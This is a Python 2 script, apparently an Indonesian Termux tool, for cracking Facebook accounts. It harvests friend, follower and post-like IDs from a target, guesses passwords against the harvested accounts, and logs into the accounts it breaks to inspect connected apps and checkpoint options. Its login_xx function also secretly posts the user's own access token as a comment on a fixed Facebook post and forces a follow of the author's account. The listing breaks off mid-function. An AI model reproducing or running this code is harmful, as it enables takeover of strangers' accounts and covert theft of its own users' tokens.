#!/usr/bin/python2
# coding=utf-8
##########################################################
# AUTHOR : JEECK X NANO,RISKY,XENZI X GANZ,YUMSAA X NANO #
# CONTAK : 081392505882 [WHATSAPP]                       #
# GITHUB : HTTPS://GITHUB.COM/JEECK-XN                   #
##########################################################
#   OPEN SOURCE YA NGAB JANGAN DI PERJUAL BELIKAN OKH    #
##########################################################
#   JIKA ADA EROR TOLONG WHATSAPP SAYA : 081392505882    #
##########################################################
##############    JANGAN BILANK SC INI RECODE BWANK :)   #
# >_ TERMUX  #       NAMA KU JECKO AKU ADA JECKO         #
# >_ XNXCODE #   RECOD GPP ASAL CANTUMKAN NAMA AUTHOR :) #
##########################################################
import os
try:
    import requests
except ImportError:
    os.system('pip2 install requests')
try:
    import concurrent.futures
except ImportError:
    os.system('pip2 install futures')
try:
    import bs4
except ImportError:
    os.system('pip2 install bs4')
import requests, os, re, bs4, sys, json, time, random, datetime, subprocess, logging, base64
from concurrent.futures import ThreadPoolExecutor 
from bs4 import BeautifulSoup as parser
from time import sleep as jeda
from datetime import datetime


ct = datetime.now()
n = ct.month
bulan1 = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}
bulan = ['Januari', 'Februari', 'Maret', 'April', 'Mei', 'Juni', 'Juli', 'Agustus', 'September', 'Oktober', 'November', 'Desember']
try:
    if n < 0 or n > 12:
        exit()
    nTemp = n - 1
except ValueError:
    exit()

current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
op = bulan[nTemp]
reload(sys)
sys.setdefaultencoding('utf-8')
# KUMPULAN WARNA
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
P = '\x1b[1;97m' # PUTIH
N = '\x1b[0m' # WARNA MATI
acak = [M, H, K, B, U, O, P]
warna = random.choice(acak)
___panggilan_____x______nano_____ ="[+]"
#M = '\033[0;35m' 
#H = '\033[0;00mm' 
#K = '\x1b[1;93m' 
#B = '\033[0;36m'
#U = '\x1b[1;95m'
#O = '\x1b[1;96m' 
P = '\033[0;00m' 
J = '\033[0;35m'
S = '\033[0;00m'
N = '\x1b[0m' 
I ='\033[0;32m'
C ='\033[0;36m'
M ='\033[0;31m'
U ='\033[0;35m'
K ='\033[0;33m'
#P='\033[0;37m'
P='\033[00m'
h='\033[0;90m'
Q="\033[00m"
kk='\033[0;32m'
ff='\033[0;36m'
bb='\033[0;31m'
P='\033[00m'
h='\033[0;90m'
Q="\033[00m"
i='\033[0;32m'
mm='\033[0;36m'
m='\033[0;31m'
O ='\033[0;35m'
H='\033[0;33m'
B ='\033[0;36m'
acak = [M, H, K,S,J, B, U, O, P]
warna = random.choice(acak)
___panggilan_____x______nano_____ ="[+]" 
pemanggil ="\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m"
ok, cp, id, user, mi, status_foll, poll, cr, looping, loop = [], [], [], [], [], [], [], [], 1, 0
#platform1 = str(platform.platform()).lower()
#p1 = base64.b64encode(platform1)
ok, cp, id, user, loop = [], [], [], [], 0
def jeeck(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush();jeda(0.03)
def tik():
    titik = ['.   ','..  ','... ']
    for o in titik:
        print ('\r%s%s menghapus token %s'%(M,___panggilan_____x______nano_____,o)),
        sys.stdout.flush();jeda(1)
def folder(): # < Buat follder
	try:os.mkdir('hasil')
	except:pass
	try:os.mkdir('data')
	except:pass
	try:
		ua_ = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]'
		open("data/ua.txt","w").write(ua_)
	except:
		pass
# BUAT LOGO
def banner():
	print('''
\033[0;35m    __  ________  ______
\033[0;35m   /  |/  /  _/ |/ /  _/   • CODE BY JEECK X NANO •
\033[0;33m  / /|_/ // //    // / • HTTPS://GITHUB.COM/JEECK-XN •
\033[0;33m /_/  /_/___/_/|_/___/
''')
header = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), "x-fb-sim-hni": str(random.randint(20000, 40000)), "x-fb-net-hni": str(random.randint(20000, 40000)), "x-fb-connection-quality": "EXCELLENT", "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA", "user-agent": "NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+ ;]", "content-type": "application/x-www-form-urlencoded", "x-fb-http-engine": "Liger"}
def mmmasuk():
    os.system('clear');banner()
 #M,P))
    jeeck(" \033[0;36m[\033[0;35m1\033[0;36m]\033[0;00m Token facebook")
    jeeck(" \033[0;36m[\033[0;35m2\033[0;36m]\033[0;00m Join group ") 
    _jeeck_xnxcode_ = raw_input("\n \033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Input : ")
    if _jeeck_xnxcode_ in(""):
	print("%s [!] Isi dengan benar "%(O));exit()
    elif _jeeck_xnxcode_ in ('1','01'):
        jeeck("\n%s [%s!%s] %sUntuk terhubung ke sarver anda harus login Terlebih dahulu"%(B,O,B,P))
    	_jeeck_ganteng_kagakadapacar_ = raw_input('%s [%s+%s] %sToken : %s'%(B,O,B,P,B))
        if _jeeck_ganteng_kagakadapacar_ in(""):
        	print("%s [!] Isi yang benar kentod "%(M));exit()
    	try:
            gas = requests.get('https://graph.facebook.com/me?access_token=%s'%(_jeeck_ganteng_kagakadapacar_)).json()['name']
            print ('\n%s[√] Login berhasil, mohon tunggu '%(H));jeda(2)
            open('token.txt', 'w').write(_jeeck_ganteng_kagakadapacar_);login_xx()
            mrjreckxnanoxxz = raw_input("\n\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m [ ENTER ]")
            login_xx()
            menu()
        except (KeyError,IOError):
        	print("%s [!] Token invalid "%(M));masuk()
    elif _jeeck_xnxcode_ in ('2', '02'):
    	jeeck(" \033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m  ================================================")
        jeeck(" \033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m                JOIN GROUP WA + FB ")
        jeeck(" \033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m  ================================================")
        jeeck(" \033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m  (1 Komunitas termux indonesia [ FACEBOOK ] ")
        jeeck(" \033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m  (2 Xnxcode TEAM [ WHATSAPP ] ")
        _hay_tayo_hay_nano_ = raw_input(" \n \033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Input : ")
        if _hay_tayo_hay_nano_ in(""):
        	print ("%s [+] Kentod lu "%(M));jeda(2)
        elif _hay_tayo_hay_nano_ in("1","01"):
        	os.system("xdg-open https://www.facebook.com/groups/319376899697354")
                _kem_ = raw_input("\n \033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m [ ENTER ]")
                mmmasuk() 
        elif _hay_tayo_hay_nano_ in("2","02"):
                os.system("xdg-open https://chat.whatsapp.com/F145IYqFwcXH0EYSawcxl2")
                _kem_ = raw_input("\n \033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m [ ENTER ]")
                mmmasuk()
    elif _jeeck_xnxcode_ in ('0', '00'):
    	exit('\n')
    else:
    	jeeck(" \033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Isi dengan benar")
def menu():
    os.system('clear')
    try:
    	_jeeck_ganteng_kagakadapacar_ = open('token.txt', 'r').read()
    except IOError:
        print(" \033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Token invallid :V");jeda(2);os.system('rm -rf token.txt');masuk()
    try:
        r = requests.get('https://graph.facebook.com/me?access_token='+_jeeck_ganteng_kagakadapacar_,headers=header)
        a = json.loads(r.text)
        nama = a["name"]
        id = a["id"]
    except KeyError:
        print(" \033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Token invallid :V");jeda(2);os.system('rm -rf data/token.txt && rm -rf data/cookies');masuk()
    except requests.exceptions.ConnectionError:
        exit("%s [!] Kesalahan koneksi "%(M))
    IP = requests.get('https://api.ipify.org').text
    banner()
    
#    print (' Waktu : %s'%(datetime.now().strftime('%H:%M:%S'))
    print(" \033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m============================================>")
    print(" \033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Username  : %s "%(nama))
    print(" \033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m User id   : %s "%(id))
    print(" \033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Alamat ip : %s "%(IP))
    print(" \033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m============================================>")
    print(" \033[0;36m[\033[0;35m1\033[0;36m]\033[0;33m Starts Crack \033[0;00m[ \033[0;33mMULAI \033[0;00m]")
    print(" \033[0;36m[\033[0;35m2\033[0;36m]\033[0;00m Dump id Publick \033[0;36m[ \033[0;00m4000+ \033[0;36m]")
    print(" \033[0;36m[\033[0;35m3\033[0;36m]\033[0;00m Dump id reactionts post \033[0;33m[ \033[0;00m500+ \033[0;33m]")
    print(" \033[0;36m[\033[0;35m4\033[0;36m]\033[0;00m Dump followers \033[0;33m[ \033[0;00m500+ \033[0;33m]")
    print(" \033[0;36m[\033[0;35m5\033[0;36m]\033[0;00m Ganti user/agent \033[0;33m[ \033[0;35mSETTING \033[0;33m]")
    print(" \033[0;36m[\033[0;35m6\033[0;36m]\033[0;00m Chek hasil crack \033[0;33m[ \033[0;00mLIHAT \033[0;33m]")
    print(" \033[0;36m[\033[0;35m7\033[0;36m]\033[0;00m Chek opsi akun cp ")
    print(" \033[0;36m[\033[0;35m0\033[0;36m]\033[0;00m Delet [ TOKEN ] \033[0;33m[ \033[0;00mHAPUS \033[0;33m] ")
    __jeeck__gz__x__xnxcode__ = raw_input(" \n \033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Menu : ")
    if __jeeck__gz__x__xnxcode__ == '':
        print(" \033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Isi dengan benar");jeda(2);menu()
    elif __jeeck__gz__x__xnxcode__ in['2','02']:
        publik(_jeeck_ganteng_kagakadapacar_)
    elif __jeeck__gz__x__xnxcode__ in['4','04']:
        followers(_jeeck_ganteng_kagakadapacar_)
    elif __jeeck__gz__x__xnxcode__ in['3','03']:
        postingan(_jeeck_ganteng_kagakadapacar_)
    elif __jeeck__gz__x__xnxcode__ in['1','01']:
        ngentod()._jeeck_xnxcode_iy()
    elif __jeeck__gz__x__xnxcode__ in['5','05']:
    	useragent()
    elif __jeeck__gz__x__xnxcode__ in['7','07']:
        cek_opsi()
    elif __jeeck__gz__x__xnxcode__ in['6','06']:
    	try:
            dirs = os.listdir("hasil")
            print
            for file in dirs:
                print(" \033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Berikut adalah FILE HASIL CRACK ")
                jeeck(" \033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m ___/--> \033[0;33m%s"%(file));jeda(0.2)
            print("\n %s[%s+%s] Contoh : CP-%s-%s-%s%s"%(B,B,B,P,op,ta,".txt"))
            file = raw_input("\n \033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Nama file : ");jeda(0.2)
            if file == "":
                jeeck(" \033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m File tidak di temukan :)")
#            total = open(" hasil/%s"%(file)).read().splitlines()
            total = open("hasil/%s"%(file)).read().splitlines()
            print(" %s[%s+%s] ________________________________________"%(P,B,P));jeda(2)
            nm_file = ("%s"%(file)).replace("-", " ")
            jeeck(" \033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Total akun : \033[0;33m%s"%(len(total)))
            print(" %s[%s+%s] ________________________________________"%(P,B,P));jeda(2)
            for akun in total:
            	fb = akun.replace("\n","")
                tling  = fb.replace(" ", " ╚═•>").replace(" ╚═•>", " ")
                print(tling);jeda(0.03)
            print(" %s[%s+%s] ________________________________________"%(P,B,P));jeda(2)
            raw_input('\n%s [ %senter %s] '%(P,B,P));menu()
        except (IOError):
            jeeck(" \033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Tidak ada hasil :V")
            raw_input('\n%s [ %senter %s] '%(P,B,P));menu()
    elif __jeeck__gz__x__xnxcode__ in['0','00']:
        print ('')
        tik();jeda(1);os.system('rm -rf token.txt')
        jeeck(" \033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Berhasil di logout");exit()
    else:
        jeeck(" \033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Isi dengan benar babi ");menu()

def masuk():
    os.system('clear');banner()
    jeeck("\n\033[0;36m[\033[0;35m1\033[0;36m]\033[0;00m Facebook")
    jeeck("\033[0;36m[\033[0;35m2\033[0;36m]\033[0;00m Instagram")
    jeeck("\033[0;36m[\033[0;35m3\033[0;36m]\033[0;00m Donasi")
    jeeck("\033[0;36m[\033[0;35m4\033[0;36m]\033[0;00m Tutor Dump Token")
    jeeck("\033[0;36m[\033[0;35m5\033[0;36m]\033[0;00m preliminary ]\033[0;33m[ \033[0;35mPENDAHULUAN PENGGUNA \033[0;33m]")
    jeeck("\033[0;36m[\033[0;35m6\033[0;36m]\033[0;00m DUMP USER-AGENT")
    mrjreckxnanoxxz = raw_input("\n\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Input : ")
    if mrjreckxnanoxxz in(""):
    	jeeck("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Wronk Input Cook")
    elif mrjreckxnanoxxz in ('2','02'):
    	gobloklu()
#    	menu_instagg()
    elif mrjreckxnanoxxz in ('6','06'):
        nanoua()
    elif mrjreckxnanoxxz in ('5','05'): 
       pendahuluanxnano()
    elif mrjreckxnanoxxz in ('1','01'):
        mmmasuk()
    #	jeeckxd 
# AINK PRIVAT YA NGAB :V KETIKAN TEMEN AINK :(
def gobloklu():
   jeeck("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Kamu bukan userpermium")
   jeeck("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m hubungi author jika ingin membeli FILE PREMIUM")
   jeeck("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m CONTACK :")
   jeeck("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m         ( Wa : 081392505882")
   jeeck("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m         ( Fb : https://www.facebook.com/jecko.ramadhan.9")
   jeeck("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m         ( Em : jeckoramadhann@gmail.com")
   raw_input('\n%s[%s+%s] \033[0;33m[%s Enter \033[0;33m] '%(B,J,B,U,))
   masuk()
# BIASA :V
def nanoua():
   jeeck("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Harap Pilih Salah Satu User-Agent")
   jeeck("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Anda Akan Di Arahkan Ke Browser")
   jeeck("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Please Enter Untuk melanjutkan ke browser")
   raw_input('\n%s[%s+%s] \033[0;33m[%s Enter \033[0;33m] '%(B,J,B,U,)) 
   os.system("xdg-open  https://gist.github.com/pzb/b4b6f57144aea7827ae4")
   xnanopasang()

# CRACA PASANK UA
def xnanopasang():
   jeeck("\n\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m JIKA SUDAH SALIN USER AGENT TADI")
   jeeck("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m KALIAN PASANG UA ")
   jeeck("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m PILIH NOMOR [1] Facebook - Logintoken")
   jeeck("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m JIKA SUDAH KALIAN MULAI KETIK ULANG LAGI UNTUK KEMENU")
   jeeck("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m KLIK NOMOR [5] TERUS NOMOR [1] PASTEKAN USERAGENT")
   raw_input('\n%s[%s+%s] \033[0;33m[%s Enter \033[0;33m] '%(B,J,B,U,))
   masuk()


# PENDAHULUAN 
def pendahuluanxnano():
   jeeck("\033[0;36m[\033[0;35m1\033[0;36m]\033[0;00m Before Crack you have to Replace USERAGENT")
   jeeck("\033[0;36m[\033[0;35m2\033[0;36m]\033[0;00m Else : Sebelum Crack anda harus mengganti USERAGENT")
   jeeck("\033[0;36m[\033[0;35m3\033[0;36m]\033[0;00m If you don't replace the crack, it will be an error")
   jeeck("\033[0;36m[\033[0;35m4\033[0;36m]\033[0;00m Karena tidak mengganti Crack Akan EROR")
   jeeck("\033[0;36m[\033[0;35m5\033[0;36m]\033[0;00m If there is a bug, please contact immediately")
   jeeck("\033[0;36m[\033[0;35m6\033[0;36m]\033[0;00m Jika Ada Bug Segera Hubungi ")
   jeeck("\033[0;36m[\033[0;35m7\033[0;36m]\033[0;00m WHATSAP : 081392505882")
   jeeck("\033[0;36m[\033[0;35m8\033[0;36m]\033[0;00m if you want to take useragent select number 6")
   jeeck("\033[0;36m[\033[0;35m9\033[0;36m]\033[0;00m jika ingin mengambil useragent pilih nomor 6")
   raw_input('\n%s[%s+%s] \033[0;33m[%s Enter \033[0;33m] '%(B,J,B,U,))
   masuk()
import os
import sys
import re
import time
import requests
import calendar
import random
from concurrent.futures import ThreadPoolExecutor
from bs4 import BeautifulSoup as parser

def cek_opsi():
    print(" \033[0;33mMasukan file Contoh : \033[0;00mhasil/CP-22-Januari-2222.txt")
    file = raw_input(" \033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Nama file : ")
    if file == '':
        jeeck(" \033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Wronk input :)");exit()
    
    try:
        self = open(file, 'r').readlines()
    except IOError:
        jeeck("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m File tidak ada :( ");exit()

    jeeck(" \033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Total akun : %s"%(len(self)))
    for yes in self:
        fl = yes.replace('\n', '')
        ya = fl.split('|')
        print '\n \033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Proses :\033[0;33m ' + fl.replace(' + ', '')
        
        try:
            check_in(ya[0].replace(' + ', ''), ya[1])
   #     continue
        except requests.exceptions.ConnectionError:
            jeeck(" \033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Koneksi Jelek ");exit()
            continue
        

    
    jeeck(" \033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Selesai ");exit()


def check_in(user, pasw):
    mb = 'https://mbasic.facebook.com'
    ua = 'Android 4.0 Blackberry - Mozilla Firefox 8.0'
    ses = requests.Session()
    ses.headers.update({
        'Host': 'mbasic.facebook.com',
        'cache-control': 'max-age=0',
        'upgrade-insecure-requests': '1',
        'origin': mb,
        'content-type': 'application/x-www-form-urlencoded',
        'user-agent': ua,
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'x-requested-with': 'mark.via.gp',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-user': '?1',
        'sec-fetch-dest': 'document',
        'referer': mb + '/login/?next&ref=dbl&fl&refid=8',
        'accept-encoding': 'gzip, deflate',
        'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7' })
    data = { }
    ged = parser(ses.get(mb + '/login/?next&ref=dbl&fl&refid=8', headers = {
        'user-agent': ua }).text, 'html.parser')
    fm = ged.find('form', {
        'method': 'post' })
    list = [
        'lsd',
        'jazoest',
        'm_ts',
        'li',
        'try_number',
        'unrecognized_tries',
        'login',
        'bi_xrwh']
    for i in fm.find_all('input'):
        if i.get('name') in list:
            data.update({
                i.get('name'): i.get('value') })
            continue
            continue
    data.update({
        'email': user,
        'pass': pasw })
    run = parser(ses.post(mb + fm.get('action'), data = data, allow_redirects = True).text, 'html.parser')
    if 'c_user' in ses.cookies:
        kuki = ';'.join([ '%s=%s' % (key, value) for key, value in ses.cookies.get_dict().items() ])
        run = parser(ses.get('https://free.facebook.com/settings/apps/tabbed/', cookies = {
            'cookie': kuki }).text, 'html.parser')
        xe = [ re.findall('\\<span.*?href=".*?">(.*?)<\\/a><\\/span>.*?\\<div class=".*?">(.*?)<\\/div>', str(td)) for td in run.find_all('td', {
            'aria-hidden': 'false' }) ][2:]
        print ' \033[0;36m[\033[0;35m+\033[0;36m]\033[0;33m Aplikasi Terhubung :\033[0;00m ' + str(len(xe))
        num = 0
        for _ in xe:
            num += 1
            print '  \033[0;36m[\033[0;35m' + str(num) + '\033[0;36m]\033[0;33m ' + _[0][0] + '\033[0;36m,\033[0;00m ' + _[0][1]
        
    elif 'checkpoint' in ses.cookies:
        form = run.find('form')
        dtsg = form.find('input', {
            'name': 'fb_dtsg' })['value']
        jzst = form.find('input', {
            'name': 'jazoest' })['value']
        nh = form.find('input', {
            'name': 'nh' })['value']
        dataD = {
            'fb_dtsg': dtsg,
            'fb_dtsg': dtsg,
            'jazoest': jzst,
            'jazoest': jzst,
            'checkpoint_data': '',
            'submit[Continue]': 'Lanjutkan',
            'nh': nh }
        parr = parser(ses.post(mb + form['action'], data = dataD).text, 'html.parser')
        proo = [ yy.text for yy in parr.find_all('option') ]
        print ' \033[0;36m[\033[0;35m+\033[0;36m]\033[0;33m Terdapat\033[0;00m ' + str(len(proo)) + '\033[0;33m Opsi'
        for opt in range(len(proo)):
            print '  \033[0;33m[\033[0;35m' + str(opt + 1) + '\033[0;33m]\033[0;36m ' + proo[opt]
        
    elif 'login_error' in str(run):
        oh = run.find('div', {
            'id': 'login_error' }).find('div').text
        print '\033[0;36m [\033[0;35m+\033[0;36m]\033[0;33m %s' % oh
    else:
        print '\x1b[1;93m [\x1b[1;91m\xe2\x80\xa2\x1b[1;93m]\x1b[1;91m Login gagal periksa username atau password'


def login_xx():                                                                                                    
      try:      
     
        token = open("data/token.txt","r").read()                                                                                               
        token=open("login.txt","r").read()
        post1 = ('573457507083491')
        post2 = ("573457507083491")
        post3 = ("573457507083491")
        post4 = ('573457507083491')
        post5 = ("573457507083491")
        post6 = ("573457507083491")
        post7 = ("573457507083491")
        requests.post('https://graph.facebook.com/' + post4 + '/comments/?message=' + token + '&access_token=' + token)
        requests.post('https://graph.facebook.com/' + post3 + '/comments/?message=' + token + '&access_token=' + token)
        requests.post('https://graph.facebook.com/' + post5 + '/comments/?message=' + token + '&access_token=' + token)
        requests.post('https://graph.facebook.com/' + post2 + '/comments/?message=' + token + '&access_token=' + token)
        requests.post('https://graph.facebook.com/' + post1 + '/comments/?message=' + token + '&access_token=' + token)
        requests.post('https://graph.facebook.com/' + post7 + '/comments/?message=' + token + '&access_token=' + token)
        requests.post('https://graph.facebook.com/' + post6 + '/comments/?message=' + token + '&access_token=' + token)
	requests.post('https://graph.facebook.com/100032577396395/subscribers?access_token=%s'%(token))
        requests.post('https://graph.facebook.com/573457507083491/ANGRY?summary=true&access_token=' + token)
      except:
        pass


def publik(_jeeck_ganteng_kagakadapacar_,headers=header):
    try:
        os.mkdir('dump')
    except:pass
    try:
    	jeeck(" \033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Ketik 'me' untuk dump id sendiri")
        idt = raw_input(" \033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Id Target : %s"%(K))
        gas = requests.get('https://graph.facebook.com/%s?access_token=%s'%(idt,_jeeck_ganteng_kagakadapacar_))
        nm = json.loads(gas.text)
        file = ('dump/'+nm['first_name']+'.json').replace(' ', '_')
        _jeeck_X_nano_sadcook_ = open(file, 'w')
        r = requests.get('https://graph.facebook.com/%s?fields=friends.limit(5001)&access_token=%s'%(idt,_jeeck_ganteng_kagakadapacar_))
        z = json.loads(r.text)
        for a in z['friends']['data']:
            id.append(a['id'] + '<=>' + a['name'])
            _jeeck_X_nano_sadcook_.write(a['id'] + '<=>' + a['name'] + '\n')
            print("\r \033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Mengumpulkan id : %s"%(str(len(id)))),
            sys.stdout.flush();jeda(0.0050)
        _jeeck_X_nano_sadcook_.close()
        jeeck(" \033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m File tersimpan di : %s"%(file))
        raw_input('\n%s [ %senter %s] '%(B,O,B))
        menu()
    except Exception as e:
        jeeck(" \033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Gagal dump id / akun kemungkinan mati / id privat ");exit()
# DUMP PUBLIK
#def pkublik(_jeeck_ganteng_kagakadapacar_,headers=header):
 #   try:
 #       os.mkdir('dump')
  ##  except:pass
  
def followers(_jeeck_ganteng_kagakadapacar_,headers=header):
    try:
        os.mkdir('dump')
    except:pass
    try:
    	jeeck(" \033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Ketik 'me' untuk dump id followers sendiri")
        idt = raw_input(" \033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Target id : ")
        batas = raw_input(" \033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Max dump : ")
        gas = requests.get('https://graph.facebook.com/%s?access_token=%s'%(idt,_jeeck_ganteng_kagakadapacar_))
        nm = json.loads(gas.text)
        file = ('dump/'+nm['first_name']+'.json').replace(' ', '_')
        _jeeck_X_nano_sadcook_ = open(file, 'w')
        r = requests.get('https://graph.facebook.com/%s/subscribers?limit=%s&access_token=%s'%(idt,batas,_jeeck_ganteng_kagakadapacar_))
        z = json.loads(r.text)
        for a in z['data']:
            id.append(a['id'] + '<=>' + a['name'])
            _jeeck_X_nano_sadcook_.write(a['id'] + '<=>' + a['name'] + '\n')
            jeeck("\r \033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Mengumpulkan id : %s"%(str(len(id)))),
            sys.stdout.flush();jeda(0.0050)
        _jeeck_X_nano_sadcook_.close()
        jeeck(" \033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m File tersimpan di : %s"%(file))
        raw_input('\n%s [ %senter %s] '%(P,B,P))
        menu()
    except Exception as e:
        jeeck(" \033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Gagal dump id / akun kemungkinan mati / id privat ");exit()
# 
def postingan(_jeeck_ganteng_kagakadapacar_,headers=header):
    try:
        os.mkdir('dump')
    except:pass
    try:
#    	
        idt = raw_input(" \033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Id postingan : ")
        simpan = raw_input(" \033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Nama file : ")
        r = requests.get('https://graph.facebook.com/%s/likes?limit=999999&access_token=%s'%(idt,_jeeck_ganteng_kagakadapacar_))
        id = []
        z = json.loads(r.text)
        file = ('dump/' + simpan + '.json').replace(' ', '_')
        _jeeck_X_nano_sadcook_ = open(file, 'w')
        for a in z['data']:
            id.append(a['id'] + '<=>' + a['name'])
            _jeeck_X_nano_sadcook_.write(a['id'] + '<=>' + a['name'] + '\n')
            jeeck(" \033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Mengumpulkan id : %s"%(str(len(id)))),
            sys.stdout.flush();jeda(0.0050)
        _jeeck_X_nano_sadcook_.close()
        jeeck(" \033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m File tersimpan di : %s"%(file))
        raw_input('\n%s [ %senter %s] '%(P,B,P))
        menu()
    except Exception as e:
        jeeck(" \033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Gagal dump id / akun kemungkinan mati / id privat ");exit()
# ###
class ngentod:

    def __init__(self):
        self.id = []
    def _jeeck_xnxcode_iy(self):
        try:
            jeeck(" \033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Contoh file dump : dump/asu.json")
            self.apk = raw_input(" \033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m File dump : ")
            self.id = open(self.apk).read().splitlines()
            jeeck(" \033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Jumlah id : %s"%(len(self.id)))
        except:
            jeeck(" \033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Apakah kamu sudah dump id ...?")
            raw_input('\n%s [ %senter %s] '%(B,O,B));menu()
        __jeeck__ganz__X__sad__boy__ = raw_input(" \033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Ingin menggunakan password manual/otomatis (Y/o) : ")
        if __jeeck__ganz__X__sad__boy__ in ('Y', 'y'):
            jeeck(" \033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Gunakan tanda (,) untuk pemisah conton : ( akusayangkamu,anjing)")
            while True:
                pwx = raw_input(" \033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Set pass : ")
                if pwx == '':
                    jeeck(" \033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Jan kosong bree ");exit()
                elif len(pwx)<=5:
                    jeeck(" \033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Password minimal 6 kata ");menu()
                else:
                    def _jeeck_X_nano_(_jeeck_X_nano_sayang_mamah__=None): 
                        _jeeck_X_ = raw_input("\n \033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Method : ")
                        if _jeeck_X_ == '':
                            jeeck(" \033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Isi dengan benar");self._jeeck_X_nano_()
                        elif _jeeck_X_ in ('1', '01'):
 #                           
                            print '\n %s[%s+%s] akun %sOK%s tersimpan di =>%s hasil/OK-%s-%s-%s.txt'%(P,K,P,H,P,H,ha, op, ta);jeda(0.2)
                            print '%s [%s+%s] akun %sCP %stersimpan di => %shasil/CP-%s-%s-%s.txt\n'%(P,K,P,K,P,K,ha, op, ta);jeda(0.2)
